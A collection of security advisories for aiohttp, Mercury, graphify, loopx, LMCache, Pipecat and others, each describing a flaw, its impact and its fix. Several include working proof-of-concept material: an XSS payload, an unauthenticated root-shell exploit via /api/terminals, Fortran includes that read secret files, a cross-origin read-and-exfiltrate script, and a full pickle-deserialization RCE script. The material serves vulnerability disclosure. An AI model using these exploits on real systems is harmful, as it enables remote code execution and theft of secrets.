items.content_html:
Summary

The keepalive timeout was not used during the initial portion of a request.

Impact

An attacker could keep an idle connection open indefinitely before sending any data.

Workaround

Use a reverse proxy (as recommended for all production deployments) with sensible keepalive limits.

References

  • https://github.com/aio-libs/aiohttp/security/advisories/GHSA-5wr8-gcqf-gqf3

items.content_html:
Summary

Mercury turns Jupyter notebooks into shared web apps/dashboards. The mr.Markdown widget converts its input to HTML with python-markdown and no sanitization step. MarkdownWidget is an ipywidgets.HTML widget, whose value is written to the page as raw HTML (via innerHTML) with no sanitization, so the result reaches the DOM verbatim. When an app passes untrusted data (database rows, user submissions, uploaded file contents, or an external/LLM API response) to mr.Markdown, HTML/JS in that data executes in the browser of whoever views the app — a data-driven stored/DOM-based XSS.

This is a library-provided rendering sink that fails to neutralize output; it is triggered by ordinary, reasonable application code, not by an author mistake.

Root cause

mercury/md.py — MarkdownWidget._to_html() (verified at v3.2.6, lines ~57–65):

def _to_html(self, text: str) -> str:
    if md_lib is not None:
        body = md_lib.markdown(text)          # python-markdown: passes raw HTML through
    else:
        body = f"<pre>{escape(text)}</pre>"   # escape() is ONLY the md-lib-absent fallback
    return self._apply_inline_theme(body)     # regex styling — adds style=, removes nothing

Two neutralization failures compound:

  1. Markdown → HTML is unsanitized. python-markdown passes raw HTML through by default: <img src=x onerror=…>, <svg onload=…>, and javascript: links survive verbatim. There is no bleach/nh3 allowlist anywhere in the package. _apply_inline_theme() only injects inline style= attributes via regex; it is not a sanitizer and removes nothing. escape() runs only in the md-lib-absent fallback.

  2. The rendering sink is unsanitized innerHTML. MarkdownWidget (mercury/md.py:21) subclasses ipywidgets.HTML. The ipywidgets HTML widget renders its value into the DOM as raw HTML via innerHTML, with no sanitization (this is the widget's design). Event-handler payloads such as <img src=x onerror=…> therefore execute when the widget is displayed.

On the "sanitize" that exists: mercury_app/notebook_sanitize.py (sanitize_notebook_for_mercury_runtime) and packages/lab/src/mercury/save.ts (sanitizeMercuryNotebookContent) strip runtime metadata and clear code-cell saved outputs. They do not neutralize HTML/JS, and they do not touch widget values or markdown source. "Sanitize" here is notebook hygiene, not XSS defense.

Threat model (attacker → victim, not self-inflicted)

The CVE-relevant framing is data-driven: the app author writes ordinary code, and the data is attacker-controlled.

import mercury as mr
# `row` comes from a DB / user submission / uploaded file / external API —
# i.e. NOT authored by the app developer:
mr.Markdown(row["comment"])

The attacker supplies the untrusted value (posts the comment, uploads the file, poisons the API/RAG source). A different user — another app user, a reviewer, an admin — then opens the app, and the payload executes in their browser. The vulnerable component (Mercury's server-side widget rendering) and the impacted component (the victim's browser session in the app origin) differ, which is the classic stored-XSS attacker/victim separation.

Amplifier — session sharing (--keep-session). Mercury can serve one shared kernel session to all viewers (mercury run … --keep-session, README "Arguments": "share the same session between multiple users … others will see this"). It is opt-in and defaults to off (keepSession=False in mercury_app/handlers.py), so it is not required for the base case — any app that renders one user's untrusted data to another user is already vulnerable. When enabled, content one viewer submits is rendered into the session other viewers see, extending this to cross-user delivery. Authentication is opt-in and off by default: a free password gate exists (mercury run … --pass=…, README), while user-based authentication is a paid add-on. Because auth is off unless the operator enables it, unauthenticated public deployments — where the attacker needs no account — are a realistic default.

Proof of Concept

import mercury as mr

# Value that would realistically arrive from untrusted data (DB row, form field,
# uploaded file, API/LLM response):
untrusted = '<img src=x onerror=alert(String.fromCharCode(88,83,83))>'

mr.Markdown(untrusted)   # rendered to raw HTML, unsanitized, into the app DOM

The generated widget HTML contains the payload verbatim; when the widget is displayed, the onerror handler runs.

What was confirmed (and how)

  • Confirmed by execution in a real browser (sink level): driving the actual python-markdown output into the same ipywidgets.HTML value sink the widget uses causes the payload to execute in headless Chromium. Execution was captured via Playwright's dialog event (which fires only on a genuine alert(), so the mere presence of the string in the HTML cannot cause a false positive). A benign control (**hello**) produced zero dialogs, confirming the harness reports only real execution. python-markdown passes <img src=x onerror=…> through verbatim by default (behavior is not version-specific).
  • Reasoned from source (not executed end-to-end): the full path from a mr.Markdown(...) call in a served Mercury app to a viewer's DOM was not run end-to-end, because no isolated container/VM was available in the reporting environment. Because MarkdownWidget is the ipywidgets.HTML sink above and Mercury's frontend applies no sanitizer to widget HTML values (the only frontend sanitizer strips notebook metadata at save time), the served-app path is expected to behave identically. Reproduce end-to-end before publishing if you want the advisory to state full-path browser confirmation.

Impact

Mercury shares notebooks as web apps/dashboards, often for non-technical audiences. When an app renders untrusted data through mr.Markdown, the generated page carries attacker-controlled script that runs in the browser of any other viewer, in the app origin — enabling session/cookie/token theft, UI spoofing and forced actions as the victim, and pivoting within the hosting origin. With --keep-session, this extends to cross-user delivery within a shared session.

Severity rationale (CVSS 3.1 per-metric)

Base score reflects the realistic default: an unauthenticated deployment whose app renders untrusted data via mr.Markdown.

Metric Value Reason
AV Attack Vector Network (N) App is served over HTTP to remote users.
AC Attack Complexity Low (L) No special conditions or race; supply data that reaches an mr.Markdown call.
PR Privileges Required None (N) Baseline: the injection channel (public form/upload/API) needs no account; auth is optional/paid. See variant below.
UI User Interaction Required (R) A victim must open/view the app page for the stored payload to run.
S Scope Changed (C) The vulnerable component (server-side widget render) injects script that executes in a different security authority — the victim's browser session/origin. (This is the canonical XSS scoping in the CVSS 3.1 spec.)
C Confidentiality Low (L) Script can read data/session material available to the app origin; scored L (not H) for a generic app without asserting full account takeover.
I Integrity Low (L) Script can alter the page and act as the victim within the app; scored L generically.
A Availability None (N) No direct availability impact.

Result: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N = 6.1 (Medium).

Deployment-dependent variants (state your environment's when filing):

  • Injection channel requires an authenticated low-privilege user → PR:L → …/PR:L/UI:R/S:C/C:L/I:L/A:N = 5.4.
  • App origin exposes high-value auth material such that XSS yields full session/account takeover → C:H/I:H raises the score; justify per deployment rather than claiming it universally.

Remediation

Primary — sanitize by default in mr.Markdown, with an explicit opt-out for the deliberate raw-HTML use case (backward-compatible, non-breaking):

# mercury/md.py
def _to_html(self, text: str, unsafe_allow_html: bool = False) -> str:
    if md_lib is not None:
        body = md_lib.markdown(text)
    else:
        body = f"<pre>{escape(text)}</pre>"
    if not unsafe_allow_html:
        # allowlist tags/attributes; strip javascript:/data: schemes and event handlers
        body = nh3.clean(body)            # or bleach.clean(..., strip=True)
    return self._apply_inline_theme(body)

Expose unsafe_allow_html=False on mr.Markdown(...) so authors who deliberately embed trusted raw HTML can opt in, while the default is safe. This mirrors the convention used by comparable tools (e.g. Streamlit's unsafe_allow_html).

Defense-in-depth: since widget HTML values are written via innerHTML without sanitization, consider sanitizing widget HTML values at the frontend before they reach the DOM, and/or serving a Content-Security-Policy that forbids inline event handlers, so a single missed sink is not immediately exploitable.

Additional hardening (secondary — not the reported vulnerability)

Several widget ESMs write the label with innerHTML, e.g. mercury/text.py topLabel.innerHTML = model.get("label") || … (same shape in number.py, time.py, date/datetime/daterange/select/json/file, and indicator.py's _card_html). This is not an attacker→victim XSS path: labels are static strings set by the app author in Python; URL/url_params overrides affect only widget value (assigned via the safe input.value property), never label, so there is no end-user/URL route into a label. It is a defense-in-depth / author footgun only. Recommended regardless: render UI strings with textContent, or html.escape labels, so output encoding is applied uniformly.

References

  • https://github.com/mljar/mercury/security/advisories/GHSA-2658-85cv-9wwq
  • https://github.com/mljar/mercury/commit/c798a85924e6614c6fea7afe5a560e4554a1d09b
  • https://github.com/mljar/mercury/releases/tag/v3.2.11
  • https://github.com/advisories/GHSA-2658-85cv-9wwq

items.content_html:
Summary

A missing comma in mercury_app/block_handler.py's BLOCKED_PATTERNS list causes the blocklist to fail to cover the /api/terminals endpoint. As a result, any unauthenticated attacker can spawn a full, interactive OS-level shell on the host running Mercury.

Details

The blocklist in mercury_app/block_handler.py is defined as:

BLOCKED_PATTERNS = [
    # JupyterLab UI + API
    r"/lab(?!/(?:extensions/|api/settings(?:/|$)|api/translations(?:/|$)))(?:/.*)?"
    r"/api/terminals(?:/.*)?",
    r"/api/shutdown(?:/.*)?",
    r"/files(?:/.*)?",
]

The missing comma between the first and the second line causes Python to merge the rules, therefore the actual list that is blocked looks like this:

/lab...(?:/.*)?/api/terminals(?:/.*)? (the first two lines joined together) /api/shutdown(?:/.*)? /files(?:/.*)?

A direct request to /api/terminals does not match any of the 3 blocklist rules and is therefore not blocked, reaching Jupyter Server's built-in terminal API, which spawns a real OS shell accessible over a WebSocket connection. No authentication, account, session or pre-existing access to Mercury is required.

PoC

Testing was performed on a local Docker deployment (https://runmercury.com/deploy/dockerfile/), Mercury version 3.2.3, default configuration.

Step 1 - spawn a terminal:

curl -i -X POST http://localhost:8888/api/terminals

Response: {"name": "1", "last_activity": "..."}

Step 2 - connect to the terminal and execute commands:

python3 -c "
import websocket, json, time

ws = websocket.create_connection('ws://localhost:8888/terminals/websocket/1')
print(ws.recv())

ws.send(json.dumps(['stdin', 'whoami && id\n']))
time.sleep(1)

ws.settimeout(2)
try:
    while True:
        print(ws.recv())
except Exception:
    pass
"

Observed output:

["setup", {}]
["stdout", "# "]
["stdout", "whoami && id\r\n"]
["stdout", "root\r\n"]
["stdout", "uid=0(root) gid=0(root) groups=0(root)\r\n# "]

Confirms full, interactive root shell access with no authentication or prior access of any kind.

Impact

  • Confidentiality: full read access to any file the Mercury process can access (notebooks, uploaded data, environment variables, secrets).
  • Integrity: attacker can modify or delete any file, including notebooks served to other users.
  • Availability: attacker can shut down or crash the server/container.
  • Lateral movement: the shell can be used as a foothold to attack other systems reachable from the host's network.

Exploitable by any network client that can reach the Mercury server, including the public internet if it is deployed without additional access controls (VPN, reverse-proxy authentication, firewall).

Fix

Add the missing comma so /api/terminals becomes an independent blocklist rule:

BLOCKED_PATTERNS = [
    # JupyterLab UI + API
    r"/lab(?!/(?:extensions/|api/settings(?:/|$)|api/translations(?:/|$)))(?:/.*)?",
    r"/api/terminals(?:/.*)?",
    r"/api/shutdown(?:/.*)?",
    r"/files(?:/.*)?",
]

References

  • https://github.com/mljar/mercury/security/advisories/GHSA-f8c7-rwf9-fmgm
  • https://github.com/mljar/mercury/commit/8c467129037ee9df269d543ac217ffd33b97bf3f
  • https://github.com/mljar/mercury/releases/tag/v3.2.4
  • https://github.com/advisories/GHSA-f8c7-rwf9-fmgm

items.content_html:
Summary

The Fortran extractor's C-preprocessor step (graphify/extractors/fortran.py, _cpp_preprocess) applies an incomplete #include hardening. The -nostdinc -I /dev/null flags it relies on (comment "Security (F-007)") do not stop a capital-F Fortran source file from including absolute paths (#include "/etc/passwd") or from path-traversing out of the corpus (#include "../../../../home/victim/.ssh/id_rsa"). cpp always searches the directory of the file being preprocessed for quoted includes and always honours absolute include paths, regardless of -nostdinc/-I. As a result, indexing an untrusted repository that contains a .F/.F90/.F95/.F03/.F08 file reads arbitrary local files off the host and inlines their contents into the knowledge graph, which is then shipped to the LLM/agent and written to the on-disk, shareable output (graph.json, GRAPH_REPORT.md, the Obsidian wiki, HTML/SVG exports).

This is the exact "corpus-side file-exfiltration vector" the F-007 comment says it is defending against; the mitigation is bypassable.

Severity

High. Arbitrary local-file read on the host, triggered by graphify's core action (indexing an untrusted folder — "turn any folder of code ... into a queryable knowledge graph"), defeating a documented security control. It runs on the default, offline, no-API-key AST path (graphify update . / graphify extract) — no credentials, network, or LLM call required. CWE-73 (external control of file name/path) / CWE-22 (path traversal) / CWE-200 (information exposure).

Where

graphify/extractors/fortran.py, _cpp_preprocess():

result = subprocess.run(
    ["cpp", "-w", "-P", "-nostdinc", "-I", "/dev/null", str(path.resolve())],
    capture_output=True, timeout=30,
)

Reached from extract_fortran() (same file) for any suffix in _FORTRAN_CPP_EXTS = {".F", ".F90", ".F95", ".F03", ".F08"}, which are collected by default (detect.CODE_EXTENSIONS) and dispatched by extract._DISPATCH.

Why the mitigation does not work

-nostdinc only removes the standard system include directories, and -I /dev/null only sets the additional search path. Neither affects:

  1. Absolute includes — #include "/etc/passwd" is opened directly by cpp.
  2. Quoted includes relative to the current file — cpp always searches the directory containing the file being preprocessed for #include "...", so #include "../../../../etc/shadow" traverses out of the corpus.

Proof of concept (verified)

Reproduced against the shipped code with the exact command _cpp_preprocess builds (cpp -w -P -nostdinc -I /dev/null <file>), and against extract_fortran() directly.

Secret on disk (/tmp/secret.txt): TOP_SECRET_...

(a) Absolute include — evil_abs.F90:

program evil
#include "/absolute/path/to/secret.txt"
end program evil

(b) Relative traversal — evil_rel.F90:

program evil
#include "../secret.txt"
end program evil

Both produce preprocessed output containing the full secret file contents ("SECRET IN OUTPUT: True" for both).

Surfacing into the graph — leak.F90 places the include in an identifier position via a free-form continuation so the leaked value becomes a node/edge:

module m
contains
subroutine s
use &
#include "/path/to/token.secret"
end subroutine s
end module m

extract_fortran() on this file emits a node whose label is the entire single-line contents of token.secret and an imports edge to it. That node is written to graph.json / GRAPH_REPORT.md / the wiki and returned by the MCP query_graph / get_node / get_neighbors tools — i.e. exfiltrated into the agent's context and into persisted, shareable artifacts.

Fidelity note: Fortran is case-insensitive, so captured identifiers are lower-cased. Case-insensitive secrets (file paths, hostnames, usernames, hex tokens, connection-string fragments, and the mere existence/partial content of a readable file) leak cleanly; high-entropy case-sensitive blobs (base64/JWT) are partially corrupted by the lower-casing but still confirm readability and structure. Single-token-per-line secret files (API-key files, single-line credential/token files) leak that token in full (lower-cased). Requires cpp/gcc on PATH (near-ubiquitous on the dev/CI hosts graphify targets); it cleanly falls back to raw bytes when absent.

Suggested fix

Mirror the containment approach already used elsewhere in the codebase (_project_xml_is_safe, security.validate_graph_path): before invoking cpp, scan the source for #include directives and refuse or neutralise any include whose target is absolute or resolves outside the corpus/repo root. Concretely, in _cpp_preprocess:

  • Parse #include "..." / #include <...> directives.
  • Resolve each target against the file's directory; if it is absolute, or its .resolve() escapes the scan root, strip that line (or fall back to path.read_bytes() with no preprocessing).
  • Only allow includes that resolve to a path inside the corpus root.

A blunter but safe alternative is to strip all #include lines before preprocessing (macros still expand; cross-file includes lose fidelity but no host files can be read). Running cpp inside a filesystem sandbox (bwrap/unshare with only the corpus mounted) would also close it but is heavier.

Detected by

Aeon vuln-scanner. Semgrep flagged the Fortran subprocess path; manual review of the F-007 mitigation plus an empirical cpp repro confirmed the bypass.

References

  • https://github.com/Graphify-Labs/graphify/security/advisories/GHSA-pcc4-rvhr-2pr8
  • https://github.com/Graphify-Labs/graphify/commit/e1d9deed6a437f2c85458ef3c42519159f322b7b
  • https://github.com/Graphify-Labs/graphify/releases/tag/v0.9.70
  • https://github.com/advisories/GHSA-pcc4-rvhr-2pr8

items.content_html:
Mercury runs a JupyterLab server with anonymous access by default (mercury_app/__main__.py sets --IdentityProvider.token='' when no --token/MERCURY_TOKEN is given; when tokenless it also sets --ServerApp.disable_check_xsrf=True). It relies on a blocklist (mercury_app/block_handler.py BLOCKED_PATTERNS: /lab, /api/terminals, /api/shutdown, /files) to keep anonymous users off dangerous Jupyter endpoints.

The vulnerability

/api/kernels is NOT in the blocklist (and cannot be — Mercury needs kernels to run notebooks), and patch_kernel_websocket_handler() (mercury_app/idle_timeout.py) only tracks the idle-timeout: it wraps on_message to call self.application._timeout_manager.touch() and then invokes the original handler with no filtering of execute_request. So any unauthenticated network client can:

POST /api/kernels {"name":"python3"}        -> 201, returns kernel id
open websocket /api/kernels/<id>/channels
send an execute_request with arbitrary code -> arbitrary Python execution = RCE

Distinct from GHSA-f8c7-rwf9-fmgm (incomplete fix)

GHSA-f8c7 was "Unauthenticated RCE via /api/terminals" — a missing-comma blocklist bypass. Its fix (add the comma so /api/terminals is blocked) does NOT address /api/kernels, which remains exploitable. The blocklist approach is fundamentally unable to cover kernels, so this is not a variant that another blocklist entry fixes.

Runtime-proven (on the patched version)

On mercury 3.2.4 — the release that fixed GHSA-f8c7 — with the default (tokenless) config, as an unauthenticated client: POST /api/terminals returns 403 (the f8c7 fix is present), but POST /api/kernels returns 201; opening the kernel websocket and sending an execute_request executed attacker-supplied Python (ran whoami as the server process user and wrote a marker file /tmp/PWNED_MERCURY_RCE). Full unauthenticated remote code execution. Deterministic PoC (client script + notebook) included.

Impact

Unauthenticated, network-reachable arbitrary code execution as the Mercury server process user on every default deployment — complete compromise of the host/container and any data/secrets it can reach.

Fix

The blocklist cannot secure an anonymous kernel-backed server. Require real per-request authentication (a token or password) by default, or restrict the kernel message channel so anonymous websocket clients cannot issue execute_request outside Mercury's own controlled execution flow.

Dedup (3-method)

OSV.dev CLEAN(0) for mercury and mljar-mercury; the repo's only advisory (GHSA-f8c7-rwf9-fmgm) covers /api/terminals only (description does not mention kernels); no issue/PR describes the /api/kernels RCE (#219/#134/#262 are "add auth" feature requests that merely confirm anonymous-by-default). Sink independently confirmed on current HEAD (blocklist omits /api/kernels; token='' default; patch_kernel_websocket_handler does no execute filtering).

Finder: Abdullah Kareem (GitHub: CyberKareem).

References

  • https://github.com/mljar/mercury/security/advisories/GHSA-rv4m-xm3f-3ccq

items.content_html:
Summary

loopx serve-status sends Access-Control-Allow-Origin: * on every response, including its unauthenticated GET routes. Because the endpoint is unauthenticated and bound to a fixed, well-known loopback port, any website the operator visits can read LoopX control-plane state and the contents of Markdown files inside every registered goal repo, using a plain fetch() with no user interaction.

The write endpoints are not affected — they are correctly Origin-checked. This report is strictly about the read paths.

Impact

While loopx serve-status is running, a page on any origin can run:

// no interaction, no preflight, no credentials needed
const s = await (await fetch('http://127.0.0.1:8766/status.json')).json();
for (const g of s.goals ?? []) {
  const m = await (await fetch(
    `http://127.0.0.1:8766/review-material?goal_id=${g.id}&path=design-notes.md`
  )).json();
  exfiltrate(m.content);
}

and read back:

  • GET /status.json — the whole status projection: goal ids, run history, and local absolute paths (registry, runtime_root). With --global-registry this covers every project registered on the machine, not just one.
  • GET /review-material?goal_id=…&path=… — the content of any .md/.markdown file under a goal's repo root, state dir, or runtime dir. In practice that is the operator's private design notes, handoff docs, and evidence write-ups.
  • GET / — endpoint discovery, including which write APIs are enabled.
  • POST /control-plane/configure-goal/dry-run — this route has no Origin check at all, and do_OPTIONS returns Access-Control-Allow-Headers: Content-Type, so a cross-origin JSON POST passes preflight. The response leaks the before/after control-plane configuration for a goal. (It does not write — I verified written=false.)

docs/public-private-boundary.md classifies "local absolute paths", "task ids", "raw logs and metrics" and "active goal state that reveals current user context" as material that must stay private. All of it is currently readable by any origin.

Two things make this more than theoretical:

  1. Fixed default ports. 8765 (project) and 8766 (global) are hardcoded defaults, so an attacker page can simply try both — no discovery step needed.
  2. It is documented as a persistent service. docs/guides/getting-started.md documents loopx serve-status, and scripts/macos-dashboard-launchagent.sh installs a LaunchAgent that keeps serve-status --global-registry --port 8766 running after every login. For anyone following that guide, this is an always-on, machine-wide read surface.

I have graded this High on the basis of zero-interaction exfiltration of private local material from a persistent service. It is read-only and scope-limited, so if you read the exposure as lower I would not argue the point — you know your users' setups better than I do.

Location

loopx/status_server.py:136-146 — StatusRequestHandler._send_json():

def _send_json(self, payload: dict[str, Any], *, status: int = 200) -> None:
    ...
    self.send_header("Access-Control-Allow-Origin", "*")   # <-- line 142

_send_json is the single response path for all routes, so the wildcard is applied to /status.json, /review-material, /healthz, / and the dry-run POSTs alike. do_OPTIONS (:148-153) repeats it.

Confirmed present at main HEAD (b0c8e315, blob c9e53d1a) at the time of writing.

What is NOT affected (I checked, so you don't have to)

I tried to refute this before reporting. These controls all hold:

  • Writes are properly defended. With --enable-reward-write-api and --enable-control-plane-write-api both on, POST /reward/append and POST /control-plane/configure-goal/apply return 403 "only accepts loopback browser origins" for a foreign Origin. is_loopback_origin() does its job. There is no cross-origin write, and DNS rebinding does not defeat it either (the rebound page still carries its own non-loopback origin).
  • No path traversal. ../../../../etc/hostname → 400; an absolute .md outside the goal roots → 400 ("outside the goal repo/state/runtime roots"). path_is_under() is correct.
  • Extension allowlist holds. secrets.env inside the repo → 400. Only .md/.markdown can be read.
  • Dry-run does not write. configure_goal_with_global_sync(execute=False) returns before any write; I observed written=false.

So the exposure is confined to: status JSON + Markdown under registered goal roots. That is still private material, but it is not arbitrary file read and it is not remote code execution.

Proof of concept

Run against an unmodified clone at HEAD, default flags (no write APIs enabled):

GET /healthz                 Origin: https://evil.example  -> 200  ACAO: '*'
GET /                        Origin: https://evil.example  -> 200  ACAO: '*'
GET /status.json             Origin: https://evil.example  -> 200  ACAO: '*'
GET /review-material?goal_id=victim-goal&path=internal-design-notes.md
                             Origin: https://evil.example  -> 200  ACAO: '*'
   content: "# Internal notes\n\nPROD_DB_HOST=db.internal.corp\nCONFIDENTIAL: ..."

The file content came back verbatim to a foreign origin. Matched controls from the same harness, with both write flags enabled (i.e. the configuration most favourable to the current design):

POST /reward/append                        Origin: https://evil.example -> 403 (origin check)
POST /control-plane/configure-goal/apply   Origin: https://evil.example -> 403 (origin check)
GET  /review-material  ../../../../etc/hostname                        -> 400 (traversal blocked)
GET  /review-material  <abs path outside roots>.md                     -> 400 (root check)
GET  /review-material  secrets.env                                     -> 400 (extension check)
GET  /status.json                          Origin: https://evil.example -> 200 ACAO '*'  <-- still readable

I am happy to send the exact harness script if it is useful; it is ~120 lines of stdlib Python and touches no file in the repo.

Suggested fix

You already have the right predicate in this file — is_loopback_origin(). The minimal fix is to stop emitting the wildcard and instead echo the request origin only when it passes that check:

def _send_json(self, payload: dict[str, Any], *, status: int = 200) -> None:
    body = json.dumps(payload, ensure_ascii=False, indent=2).encode("utf-8")
    self.send_response(status)
    self.send_header("Content-Type", "application/json; charset=utf-8")
    self.send_header("Content-Length", str(len(body)))
    self.send_header("Cache-Control", "no-store")
    origin = self.headers.get("Origin")
    if origin and is_loopback_origin(origin):
        self.send_header("Access-Control-Allow-Origin", origin)
        self.send_header("Vary", "Origin")
    # no Origin header (curl, the CLI, a same-origin fetch) -> send no ACAO at all
    self.end_headers()
    self.wfile.write(body)

and the same in do_OPTIONS. This keeps the dashboard working — it is served from http://127.0.0.1:5174 and fetches 127.0.0.1:8765/8766, which is cross-origin between two loopback ports, which I assume is exactly why the wildcard was added — while denying every non-loopback origin.

Two optional hardening steps, if you want them:

  • Apply the existing is_loopback_origin() check to POST /control-plane/configure-goal/dry-run and POST /reward/dry-run too, so the config projection is not readable cross-origin.
  • Add a Host header check (reject a Host that is not loopback) to close DNS rebinding against clients that do not send Origin.

Scope of review

Reviewed 26/52 identified entrypoints across 758 files (360,618 LOC) of the loopx package and dashboard; tools: semgrep 1.172.0, trufflehog 3.96.0, osv-scanner 2.4.0, plus a manual dataflow pass. Skipped: tests/, regression/, examples/, docs/, and the benchmark adapters under loopx/benchmark_adapters/. Coverage confidence: partial.

Other things I looked at and did not find a problem with, in case it saves you time: self-update (curl | bash is over HTTPS to a hardcoded raw.githubusercontent.com URL; the LOOPX_ARCHIVE_URL override requires environment control, i.e. privileges the attacker would have to already have); project/slash-command skill installation (strict id regex plus _assert_project_boundary() containment); the shell=True worker tick (the value is a user-configured shell command by design, and demo_supervisor.build_visible_worker_turn_command passes the objective through shlex.quote); outbound SSRF surfaces (content_ops/surface.py blocks private/loopback/link-local ranges and refuses redirects). No pickle, yaml.load, eval, or os.system anywhere in the package.

3 dependency advisories exist in dev/docs tooling only (pymdown-extensions, idna, postcss); none are reachable from the runtime package, which declares no dependencies, so I have not opened a bump PR.

Aeon, an automated security review. Findings are reproduced at HEAD and manually verified before reporting. Reported privately via GitHub PVR because that is the intake channel your SECURITY.md designates.

Summary

LMCache is vulnerable to Unauthenticated Remote Code Execution via Pickle Deserialization on the Multiprocess ZMQ Transport

Details

LMCache multiprocess mode, also called distributed mode, opens an unauthenticated ZeroMQ ROUTER so worker processes can register and share KV cache blocks. The intended clients are sibling LMCache processes. There is no CURVE, ZAP, password, or message authentication on that socket. LMCache used only inside a vLLM process does not open this port. The transport binds to localhost unless the operator sets a routable address with --host, which is how multi-node deployments let peers connect. The 9.8 score is for that routable configuration. A stock single-host install that leaves the default bind is not reachable from other machines.

Messages on the socket are msgpack. Extension code 1 is registered for DeviceIPCWrapper and is passed to DeviceIPCWrapper.Deserialize in lmcache/v1/platform/base/ipc_wrapper.py, which calls pickle.loads. That hook runs from ext_hook in lmcache/v1/multiprocess/custom_types.py while the server is still decoding REGISTER_KV_CACHE arguments, before the handler runs. A single unauthenticated ZMQ DEALER message to the transport port (default 5555) therefore executes code as the user the LMCache process runs as. Official container images run that process as root.

The decode path shipped in v0.3.9. It is still present in the latest PyPI release, v0.5.5, in the v0.5.6 release candidates through v0.5.6rc3, and on the dev branch as of 2026-10-07. No fixed version has been published.

Proof of concept

Step 1 - Start multiprocess mode bound to a routable address

This is the documented multi-node setting. The ZMQ transport listens on port 5555.

   python -m lmcache.v1.multiprocess.http_server \
    --http-host 127.0.0.1 --http-port 8080 \
    --host 0.0.0.0 --port 5555 \
    --l1-size-gb 0.25 --eviction-policy LRU \
    --hash-algorithm blake3 --instance-id mp-node-01

Step 2 - Build a REGISTER_KV_CACHE frame whose cache slot is a pickle

Payload slot 1 is a msgpack extension with code 1. The server unpickles that body while it is still decoding arguments. The command writes id to /tmp/zmq_pwn.

import os
import pickle
import msgspec
import zmq

class EvilPayload:
    def __init__(self, cmd):
        self.cmd = cmd
    def __reduce__(self):
        return (os.system, (self.cmd,))

evil_pickle = pickle.dumps(EvilPayload("id > /tmp/zmq_pwn 2>&1"))

REGISTER_KV_CACHE = 1
EXT_CODE = 1
NUM_PAYLOADS = 7
KVCACHE_INDEX = 1

b_uid = msgspec.msgpack.encode(0)
b_type = msgspec.msgpack.encode(REGISTER_KV_CACHE)
payloads = [msgspec.msgpack.encode(None)] * NUM_PAYLOADS
payloads[0] = msgspec.msgpack.encode(0)
payloads[KVCACHE_INDEX] = msgspec.msgpack.encode(
    [msgspec.msgpack.Ext(EXT_CODE, evil_pickle)]
)
frames = [b_uid, b_type, *payloads]

Step 3 - Send the frame

ctx = zmq.Context()
s = ctx.socket(zmq.DEALER)
s.connect("tcp://127.0.0.1:5555")
s.send_multipart(frames)

The pickle runs during argument decode. The server then logs a type error for REGISTER_KV_CACHE because the handler expected a DeviceIPCWrapper and received the return value of os.system. That error is after the command has already run.

Step 4 - Confirm the command ran as the LMCache user

cat /tmp/zmq_pwn

Expected output on an official image, where the process runs as root:

uid=0(root) gid=0(root) groups=0(root)

Impact

LMCache's multiprocess (MP) mode uses a ZeroMQ transport (port 5555 by default) that does not require authentication. Device IPC descriptors received on this transport were deserialized with pickle.loads. An attacker who can reach the transport port can send a single crafted message and execute arbitrary code with the privileges of the LMCache process.

By default the transport binds to localhost, and single-process (in-process) mode does not open the port. Deployments are exposed when the transport binds a routable address, as multi-node setups do. The project's example Kubernetes deployment bound all interfaces, and official container images ran as root, so deployments based on them should be treated as exposed.

Affected: 0.3.9 through 0.5.5, the 0.5.6 release candidates, and dev branch builds before PR #5644.

Patches

Fixed in 0.5.6. Pickle has been replaced with versioned, typed MessagePack descriptors that are validated before use; the device wrapper type is selected from a fixed local allowlist, and there is no pickle fallback. Both the ZeroMQ and gRPC transport paths are covered.

The wire format has changed: upgrade all workers and servers together.

0.5.6 also binds the example Kubernetes deployment to localhost (PR #5684) and runs official images as a non-root user (PR #5685).

Workarounds

Until you can upgrade:

  • Do not bind the transport to a routable address; keep it on localhost or a trusted cluster network.
  • Restrict access to the transport port (5555 by default) with firewall rules or network policies.
  • Run LMCache as a non-root user (build from the provided Dockerfile if needed).

If the transport port was ever reachable from an untrusted network, treat the host as potentially compromised: review connections to the port, check for unexpected processes or outbound connections from the LMCache process, rotate reachable credentials, and redeploy from clean images.

Impact

A path traversal vulnerability in the revision command allowed a crafted migration name supplied via the -m argument to escape the intended migrations directory.

Under specific conditions, an attacker could cause the tool to create a .sql file in an arbitrary location writable by the user executing the command.

This issue is only exploitable if an attacker can influence the migration name passed to the revision command, such as through an insecure automation or CI/CD pipeline that forwards untrusted input.

Patches

The vulnerability has been fixed in version 1.0.3 by validating and sanitizing the migration name to prevent directory traversal.

Users should upgrade to version 1.0.3 or later.

Workarounds

Do not pass untrusted input to the revision -m argument.

If upgrading is not immediately possible, ensure that only trusted users or automation can invoke the revision command and that migration names are validated before being passed to the tool.

Pipecat’s built-in development runner exposes endpoints that create bot sessions and, for the Daily transport, paid Daily rooms. These development endpoints intentionally do not authenticate callers.

The runner binds to localhost by default and is designed exclusively for local development. It is not built or supported as a production server. Exploitation therefore requires an operator to deliberately make the development runner reachable from an untrusted network, such as by setting --host 0.0.0.0, publishing its port, or using a public tunnel without access controls.

If exposed in this way, an unauthenticated caller may invoke endpoints including /start, /daily, and /daily-dialin-webhook. Depending on the endpoint and configuration, this can create a bot session or Daily room and may return a room URL and join token. Repeated requests may also consume local resources and third-party service quotas.

The consequences of interacting with a launched bot depend on that bot’s configuration and connected tools. Access to external systems or sensitive information is not an inherent capability of the development runner and is therefore not included as a general impact.

Pipecat 1.6.0 clarifies this security boundary in two ways:

  • The development runner displays a prominent startup banner identifying it as a development tool.
  • The documentation explicitly states that the runner must not be used as a production server or exposed directly to untrusted traffic.

The local development documentation (https://docs.pipecat.ai/pipecat/deployment/running-bots-locally) identifies the unauthenticated endpoints, lack of rate limiting, and risks of public exposure. The production deployment documentation (https://docs.pipecat.ai/pipecat/deployment/running-bots-in-production) directs users to a production dispatcher or managed runtime and describes minimum protections for limited prototype use.

Resolution

Pipecat 1.6.0 documents and surfaces the intended security boundary of the development runner. The unauthenticated development behavior remains by design. Users must not expose the runner directly to untrusted networks; production deployments require an authenticated dispatcher or managed runtime.

Description

A Markdown file or a notebook output can carry a button that runs a JupyterLab command. Since 4.5.7 the first click on such a button opens a prompt naming the command, with Cancel, Run Once and Trust. Choosing Trust runs the command and marks the document trusted, so its later buttons run without a prompt.

